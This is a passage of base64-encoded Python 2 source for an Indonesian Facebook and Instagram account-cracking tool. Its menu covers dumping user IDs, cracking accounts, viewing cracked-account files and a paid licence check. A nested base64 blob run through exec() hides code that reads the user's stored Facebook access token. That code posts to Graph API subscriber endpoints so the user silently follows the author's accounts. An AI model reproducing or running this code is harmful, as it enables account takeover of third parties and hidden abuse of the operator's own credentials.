GF0YV8pKQ0KCWV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCgkJcHJpbnQgKCIlc+KAoiBnYWdhbCBtZW5kZXRla3NpIiUoTSkpDQoNCiMgTUVOVSBJTkkgQUpHDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWZvbGRlcigpDQoJ""dHJ5Og0KCQlsaXMgPSBvcGVuICgiZGF0YS9saXNlbnNpLnR4dCIsInIiKS5yZWFkKCkNCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIik7cHJpbnQgKCIlc+KAoiBMaXNlbnNpIGthZGFsdWFyc2EiJShNKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oInJtIC1yZiBkYXRhL2xpc2Vuc2kudHh0IikNCgkJa2V5KCkua29uZmlybWFzaSgpDQoJaWYgb3MucGF0aC5leGlzdHMoJ2RhdGEvbGlzZW5zaS50eHQnKToNCgkJdHJ5Og0KCQkJbGlzID0gb3BlbignZGF0YS9saXNlbnNpLnR4dCcsICdyJykucmVhZCgpDQoJCQlnaXQgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS93YXJiYTI5L2xpc2Vuc2kvYmxvYi9tYWluL2lkLnR4dCcpLnRleHQuc3RyaXAoKQ0KCQkJaWYgbGlzIGluIGdpdDoNCgkJCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJCQliYW5uZXIoKQ0KCQkJCXByaW50KCJcbiIpDQoJCQkJcyA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQkJCWZvciBtIGluIHM6DQoJCQkJCXByaW50ICdcclx4MWJbMTs5NW3igKJceDFiWzE7OTZtIE1lbWVyaWtzYSBsaXNlbnNpICcgKyBtLA0KCQkJCQlzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgxKQ0KCQkJCWphbGFuKCdcbiVz4oCiIExpc2Vuc2kgdGVyc2VkaWEg4oiaJyUoSCkpO2plZGEoMSk7b3Muc3lzdGVtKCdjbGVhcicpDQoJCQllbHNlOg0KCQkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQkJCWJhbm5lcigpDQoJCQkJcHJpbnQoIlxuIikNCgkJCQlzID0gWycuICAgJywgJy4uICAnLCAnLi4uICddDQoJCQkJZm9yIG0gaW4gczoNCgkJCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTWVtZXJpa3NhIGxpc2Vuc2kgJyArIG0sDQoJCQkJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQoJCQkJamFsYW4oJ1xuJXPigKIgTGlzZW5zaSB0aWRhayB0ZXJzZWRpYSclKE0pKTtqZWRhKDEpDQoJCQkJa2V5KCkua29uZmlybWFzaSgpDQoJCWV4Y2VwdCBJT0Vycm9yOg0KCQkJb3Muc3lzdGVtKCJybSAtcmYgZGF0YS9saXNlbnNpLnR4dCIpDQoJCQlrZXkoKS5rb25maXJtYXNpKCkNCgllbHNlOg0KCQlrZXkoKS5rb25maXJtYXNpKCkNCgl0cnk6DQoJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50ICgiJXMlcyBPcHMgYW5kYSBiZWx1bSBsb2dpbiAiJShNLHRpbCkpO2plZGEoMik7b3Muc3lzdGVtKCdybSAtcmYgZGF0YS90b2tlbi50eHQgJiYgcm0gLXJmIGRhdGEvY29va2llcycpO21hc3VrKCkNCgl0cnk6DQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3JvbXosaGVhZGVycz1oZWFkZXIpDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJbmFtYSA9IGFbIm5hbWUiXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgKCIlcyVzIFRva2VuIGludmFsaWQgIiUoTSx0aWwpKTtqZWRhKDIp""O29zLnN5c3RlbSgncm0gLXJmIGRhdGEvdG9rZW4udHh0ICYmIHJtIC1yZiBkYXRhL2Nvb2tpZXMnKTttYXN1aygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcblxuJXMlcyB0aWRhayBhZGEga29uZWtzaSVzXG4nJShNLHRpbCxOKSkNCgliYW5uZXIoKQ0KCXByaW50ICgnJXMgIyAlc05hbWUgJXM6ICVzJXMlcyBcbiclKFUsTyxNLEgsbmFtYSxPKSkNCglwcmludCAoJyVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDIgJXNEdW1wIGlkIGZvbGxvd2VycyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDMgJXNEdW1wIGlkIHJlYWN0aW9uIHBvc3QnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA0ICVzRHVtcCBpZCBhbmdnb3RhIGdyb3VwJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwNSAlc0R1bXAgaWQgcGVuY2FyaWFuIG5hbWEnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA2ICVzRHVtcCBpZCBwZXNhbiBtZXNlbmdnZXInJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA3ICVzRHVtcCBpZCAodW50dWsgbWVuY2FyaSBpZCBvbGQpJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwOCAlc0NyYWNrIGZhY2Vib29rJyUoVSxQLEgpKQ0KCXByaW50ICgnJXPigKIlcyAwOSAlc0NyYWNrIGluc3RhZ3JhbSclKFUsUCxIKSkNCglwcmludCAoJyVz4oCiJXMgMTAgJXNTZXR0aW5nIHVzZXIgYWdlbnQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDExICVzQ2VrIGhhc2lsIGNyYWNrJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAxMiAlc0NlayBvcHNpIGFrdW4nJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDEzICVzSW5mbyBzY3JpcHQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIHJtICVzSGFwdXMgYWt1biclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDAgJXNLZWx1YXInJShVLE0sTykpDQoJc2x1dCA9IHJhd19pbnB1dCgnXG4lcyMgJXNQaWxpaCAlcz4gJXMnJShQLE8sTSxLKSkNCglqaWVoKHNsdXQscm9teikNCmRlZiBqaWVoKHNsdXQscm9teik6DQogICAgaWYgc2x1dCA9PSAnJzoNCiAgICAgICAgcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMScsJzAxJ106DQogICAgCWdhbiA9IHJhd19pbnB1dCAoIlxuJXMlcyVzIGFwYWthaCBhbmRhIGluZ2luIGdhbmRha2FuIGlkPyB5L3QlcyA+JXMgIiUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBpZiBnYW4gaW5bIiJdOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICBlbGlmIGdhbiBpblsneScsJ1knXToNCiAgICAgICAgCW1hc3NhbChyb216KQ0KICAgICAgICBlbGlmIGdhbiBpblsndCcsJ1QnXToNCiAgICAgICAgCXB1Ymxpayhyb216KQ0KICAgICAgICBlbHNlOg0KICAg""ICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMicsJzAyJ106DQogICAgICAgIGZvbGxvd2Vycyhyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnMycsJzAzJ106DQogICAgICAgIHBvc3Rpbmdhbihyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnNCcsJzA0J106DQogICAgICAgIGdyb3VwKF9fcm9tel9fKCkpDQogICAgZWxpZiBzbHV0IGluWyc1JywnMDUnXToNCiAgICAJZHVtcGZsKCk7ZXhpdCgpDQogICAgZWxpZiBzbHV0IGluWyc2JywnMDYnXToNCiAgICAJcGVzYW4oX19yb216X18oKSkNCiAgICBlbGlmIHNsdXQgaW5bJzcnLCcwNyddOg0KICAgIAlkdW1wX2lkKCkucGlsaWhhbigpDQogICAgZWxpZiBzbHV0IGluWyc4JywnMDgnXToNCiAgICAgICAgbmdlbnRvZCgpLnJvbWl5KCkNCiAgICBlbGlmIHNsdXQgaW5bJzknLCcwOSddOg0KICAgIAlpZ2coKQ0KICAgIGVsaWYgc2x1dCBpblsnMTAnXToNCiAgICAJdXNlcmFnZW50KCkNCiAgICBlbGlmIHNsdXQgaW5bJzExJ106DQogICAgCXByaW50ICgiXG4lcyVzJXMgMDEgJXNDZWsgaGFzaWwgYWt1biBmYWNlYm9vayAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMiAlc0NlayBoYXNpbCBha3VuIGluc3RhZ3JhbSAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMyAlc0hhcHVzIGhhc2lsIGNyYWNrICIlKFUsdGlsLFAsTykpDQogICAgICAgIHByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KICAgICAgICByb20gPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQogICAgICAgIGNla19jZWsocm9tKQ0KICAgIGVsaWYgc2x1dCBpblsnMTInXToNCiAgICAJZmlsZV9jcCgpDQogICAgZWxpZiBzbHV0IGluWycxMyddOg0KICAgIAlpbmdmb2goKQ0KICAgIGVsaWYgc2x1dCBpblsncm0nLCdSbScsJ1JNJ106DQogICAgICAgIHByaW50ICgnJykNCiAgICAgICAgdGlrKCk7amVkYSgxKTtvcy5zeXN0ZW0oJ3JtIC1yZiBkYXRhL3Rva2VuLnR4dCAmJiBybSAtcmYgZGF0YS9jb29raWVzJykNCiAgICAgICAgamFsYW4oJ1xuJXMlcyBiZXJoYXNpbCB0ZXJoYXB1cyAnJShILHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgc2x1dCBpblsnMCcsJzAwJ106DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojSEFQVVMgSEFTSUwNCmRlZiBoYXB1c19oYXNpbCgpOg0KCW9zLnN5c3RlbSgncm0gLXJmIENQLyogJiYgT0svKicpDQoJb3Muc3lzdGVtKCdybSAtcmYgb2tlaC50eHQgJiYgY2VwZWgudHh0JykNCglwcmludCAoJycpO2plZGEoMikNCglqYWxhbiAoSCsnIOKImiBiZXJoYXNpbCBtZW5naGFwdXMgaGFzaWwgY3JhY2sgJyk7amVkYSgyKQ0KCW1lbnUoKQ0KIyBDRUsgSEFTSUwNCmRlZiBoYXNpbGwo""KToNCglwcmludCAoIlxuJXMlcyVzIDAxICVzQ2VrIGhhc2lsIGFrdW4gJXNPSyAiJShVLHRpbCxQLE8sSCkpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgaGFzaWwgYWt1biAlc0NQICIlKFUsdGlsLFAsTyxLKSkNCglwcmludCAoIiVzJXMlcyAwMCAlc0tlbWJhbGkgIiUoVSx0aWwsTSxPKSkNCmRlZiBjZWtfY2VrKHJvbSk6DQoJaWYgcm9tIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgcm9tIGluWycxJywnMDEnXToNCgkJaGFzaWxfZmIoKQ0KCWVsaWYgcm9tIGluWycyJywnMDInXToNCgkJaGFzaWxfaWdlaCgpDQoJZWxpZiByb20gaW5bJzAzJywnMyddOg0KCQloYXB1c19oYXNpbCgpDQoJZWxpZiByb20gaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBGQUNFQk9PSw0KZGVmIGhhc2lsX2ZiKCk6DQoJaGFzaWxsKCkNCglsID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiAlcyAnJShQLE8sTSxLKSkNCglpZiBsIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgbCBpblsnMScsJzAxJ106DQoJCWRpcnMgPSBvcy5saXN0ZGlyKCdPSycpDQoJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQlmb3IgZmlsZSBpbiBkaXJzOg0KCQkJcHJpbnQoIiVz4oCiJXM+ICVzJXMiJShVLE0sSCxmaWxlKSk7amVkYSgwLjA3KQ0KCQl0cnk6DQoJCQlmaWxlID0gcmF3X2lucHV0KCJcbiVz4oCiJXMgbWFzdWthbiBmaWxlICVzOiVzICIlKFUsTyxNLEgpKTtqZWRhKDAuMikNCgkJCWlmIGZpbGUgaW5bJyddOg0KCQkJCWV4aXQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCIlKE0pKQ0KCQkJdG90YWxvayA9IG9wZW4oJ09LLyVzJyAlIGZpbGUpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQlwcmludCgiJXMlcyBmaWxlIHRpZGFrIGFkYSAiJShNLHRpbCkpDQoJCW5tX2ZpbGUgPSAoJyVzJyAlIGZpbGUpLnJlcGxhY2UoJy0nLCAnICcpDQoJCWZpbGVfbm0gPSBubV9maWxlLnJlcGxhY2UoJy50eHQnLCAnJykNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlqYWxhbigiJXPigKIlcyBoYXNpbCB0YW5nZ2FsJXMgOiAlcyVzICVzdG90YWwgJXM6ICVzJXMiJShVLE8sTSxILGZpbGVfbm0sTyxNLEgsbGVuKHRvdGFsb2spKSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJb3Muc3lzdGVtKCdjYXQgT0svJXMnICUgZmlsZSkN""CgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlleGl0KCdcbicpDQoJZWxpZiBsIGluWycyJywnMDInXToNCgkJZGlycyA9IG9zLmxpc3RkaXIoJ0NQJykNCgkJcHJpbnQgKCJcbiVz4oCiJXMgWyVzIGhhc2lsIGNyYWNrIHlhbmcgdGVyc2ltcGFuICVzXVxuIiUoVSxPLFUsTykpDQoJCWZvciBmaWxlIGluIGRpcnM6DQoJCQlwcmludCgiJXPigKIlcz4gJXMlcyIlKFUsTSxLLGZpbGUpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCWZpbGUgPSByYXdfaW5wdXQoIlxuJXPigKIlcyBtYXN1a2FuIGZpbGUgJXM6JXMgIiUoVSxPLE0sSykpO2plZGEoMC4yKQ0KCQkJaWYgZmlsZSBpblsnJ106DQoJCQkJZXhpdCgiJXPigKIgaXNpIHlhbmcgYmVuYXIga2VudG9kIiUoTSkpDQoJCQl0b3RhbGNwID0gb3BlbignQ1AvJXMnICUgZmlsZSkucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCXByaW50KCIlcyVzIGZpbGUgdGlkYWsgYWRhICIlKE0sdGlsKSkNCgkJbm1fZmlsZSA9ICgnJXMnICUgZmlsZSkucmVwbGFjZSgnLScsICcgJykNCgkJZmlsZV9ubSA9IG5tX2ZpbGUucmVwbGFjZSgnLnR4dCcsICcnKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWphbGFuKCIlc+KAoiVzIGhhc2lsIHRhbmdnYWwlcyA6ICVzJXMgJXN0b3RhbCVzIDogJXMlcyIlKFUsTyxNLEssZmlsZV9ubSxPLE0sSyxsZW4odG90YWxjcCkpKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oJ2NhdCBDUC8lcycgJSBmaWxlKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWV4aXQoJ1xuJykNCgllbGlmIGwgaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBJR0VIDQpkZWYgaGFzaWxfaWdlaCgpOg0KCWhhc2lsbCgpDQoJd2hpbGUgVHJ1ZToNCgkJcm9tID0gcmF3X2lucHV0KCdcbiVzIyAlc1BpbGloICVzPiAlcyclKFAsTyxNLEspKQ0KCQlpZiByb20gaW5bJzEnLCcwMSddOg0KCQkJdHJ5Og0KCQkJCW9rZSA9IG9wZW4oIm9rZWgudHh0IiwgInIiKS5yZWFkbGluZXMoKQ0KCQkJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQkJCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMlcyIlKFAsTSxQLEspKTtqZWRhKDIpDQoJCQkJcHJpbnQgKCIlc+KA""oiAlc0p1bWxhaCAlczogJXMlcyIlKFUsTyxNLEgsc3RyKGxlbihva2UpKSkpDQoJCQkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJCQlva2VrID0gb3Blbigib2tlaC50eHQiLCAiciIpLnJlYWQoKQ0KCQkJCXByaW50IChva2VrKQ0KCQkJCWV4aXQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSykpO2plZGEoMikNCgkJCWV4Y2VwdCBJT0Vycm9yLEtleUVycm9yOg0KCQkJCWV4aXQgKE0rIlxu4oCiIHRpZGFrIGFkYSBoYXNpbCBhd29rYXdva2F3b2siKQ0KCQllbGlmIHJvbSBpblsnMicsJzAyJ106DQoJCQl0cnk6DQoJCQkJY2VwZSA9IG9wZW4oImNlcGVoLnR4dCIsICJyIikucmVhZGxpbmVzKCkNCgkJCQlwcmludCAoIlxuJXPigKIlcyBbJXMgaGFzaWwgY3JhY2sgeWFuZyB0ZXJzaW1wYW4gJXNdXG4iJShVLE8sVSxPKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCXByaW50ICgiJXPigKIgJXNKdW1sYWggJXM6ICVzJXMiJShVLE8sTSxLLHN0cihsZW4oY2VwZSkpKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCWNlcGVrID0gb3BlbigiY2VwZWgudHh0IiwgInIiKS5yZWFkKCkNCgkJCQlwcmludCAoY2VwZWspDQoJCQkJZXhpdCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJZXhjZXB0IElPRXJyb3IsS2V5RXJyb3I6DQoJCQkJZXhpdCAoTSsiXG7igKIgdGlkYWsgYWRhIGhhc2lsIGF3b2thd29rYXdvayIpDQoJCWVsaWYgcm9tIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KIyBMSVNFTlNJDQpkZWYgZ2V0X2xpY2Vuc2UoaW50ZWdlcik6DQogICAgbGlzID0gbGlzdCgiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY3ODkiKQ0KICAgIGdldHMgPSBbcmFuZG9tLmNob2ljZShsaXMpIGZvciBfIGluIHJhbmdlKGludGVnZXIpXQ0KICAgIHJldHVybiAiIi5qb2luKGdldHMpLnVwcGVyKCkNCg0KY2xhc3Mga2V5Og0KCQ0KCWRlZiBfX2luaXRfXyhzZWxmKToNCgkJc2VsZj1bXQ0KCQ0KCWRlZiBrb25maXJtYXNpKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJYmFubmVyKCkNCgkJcHJpbnQoJ1xuJykNCgkJeSA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQlmb3IgbSBpbiB5Og0KCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTW9ob24gdHVuZ2d1ICcgKyBtLA0KCQkJc3lzLnN0""ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJZGlnaXQgPSByYW5kb20uY2hvaWNlKFsyMF0pDQoJCWlkID0gZ2V0X2xpY2Vuc2UoZGlnaXQpDQoJCWxwZyA9IG9wZW4oJ2RhdGEvbGlzZW5zaS50eHQnLCAndycpDQoJCWxwZy53cml0ZShpZCkNCgkJbHBnLmNsb3NlKCkNCgkJcHJpbnQgKCJcblxuJXPigKIlcyBEYWZ0YXIgbGlzdCBoYXJnYSAlczoiJShVLE8sTSkpO2plZGEoMC4wNykNCgkJcHJpbnQgKCIgICVzLSVzIDEwayAzIGhhcmkiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyAyMGsgMSBtaW5nZ3UiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyA1MGsgMSBidWxhbiIlKFAsTykpO2plZGEoMC4wNykNCgkJamFsYW4gKCdcbiVz4oCiICVzTGlzZW5zaSVzIDogJXMlcyclKFUsTyxNLEgsaWQpKTtqZWRhKDEpDQoJCWphbGFuICgnJXPigKIgJXNMaXNlbnNpIEJlbHVtIERpIGtvbmZpcm1hc2knJShVLE8pKQ0KCQlzdWg9cmF3X2lucHV0KCJcbiVz4oCiJXMgaW5naW4gYmVsaSBsaXNlbnNpPyB5L3QgJXM6ICVzIiUoVSxPLE0sSykpDQoJCWlmIHN1aCBpblsnJ106DQoJCQlleGl0KCkNCgkJZWxpZiBzdWggaW5bInkiLCJZIl06DQoJCQlqYWxhbiAoIlxuJXPigKIlcyBtZW51anUga2Ugd2hhdHNhcCB1bnR1ayBtZW1iZWxpIGxpc2Vuc2kgIiUoVSxPKSkNCgkJCWphbGFuICgiJXPigKIlcyBubyB3aGF0c2FwIHNheWEgJXM6ICVzKzYyODIzNzE2NDgxODYgIiUoVSxPLE0sSCkpDQoJCQlvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzYyODIzNzE2NDgxODY/dGV4dD1Bc3NhbGFtdWFsYWlrdW0rc2F5YStpbmdpbitiZWxpK2xpc2Vuc2k6KycraWQrJz4vZGV2L251bGwnKTtqZWRhKDEpO2V4aXQoKQ0KCQllbGlmIHN1aCBpblsidCIsIlQiXToNCgkJCWV4aXQoKQ0KCQllbGlmIHN1aCBpblsicHl0aG9uMiBiZmYtMi5weSJdOg0KCQkJbWVudSgpDQoJCWVsc2U6DQoJCQlleGl0KCkNCgkNCmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnWkdWbUlHeHZaMmx1WDNoNEtDazZDaUFnSUNCMGNuazZDaUFnSUNBZ0lDQWdkRzlyWlc0Z1BTQnZjR1Z1S0NKa1lYUmhMM1J2YTJWdUxuUjRkQ0lzSW5JaUtTNXlaV0ZrS0NrZ0NpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ESXlNRGcyTVRjeU5UVTJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCR1lXNXpjR0ZuWlNCU2IyMXBJRmhFQ2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNE5ETTBPRGd3TlRJNUwzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJTYjIxcElFRm1jbWw2WVd3S0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZi""Uzh4TURBd05qYzRNRGMxTmpVNE5qRXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUZKdmJXa2dRV1p5YVhwaGJDQW9NakF5TVNrS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd01ETTNNak0yT1RZNE9EVXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVseFltRnNJR0p2WW5vS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05ERXhNamt3TkRnNU5EZ3ZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVsM1lXNGdhR0ZrYVdGdWMzbGhhQW9nSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNRb0oyaDBkSEJ6T2k4dlozSmhjR2d1Wm1GalpXSnZiMnN1WTI5dEx6RXdNREF3TnpVeU1ESXdNelExTWk5emRXSnpZM0pwWW1WeWN6OWhZMk5sYzNOZmRHOXJaVzQ5SlhNbkpTaDBiMnRsYmlrcElDTWdTR0Z0ZW1Gb0lHdHBjbUZ1WVFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBd01qUTJNVE0wTkRFM09DOXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nVlc1cGF5QlNUMDFKSUVGR1VrbGFRVXdLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TnpFM05EYzBNakExT0RNdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRVJ2Ym1sbWRHWmhibTU1Q2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNU1UUXpNVEV4TlRZM0wzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJFWlcxcGRDQlNiMjFwSUVGbWNtbDZZV3dLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOH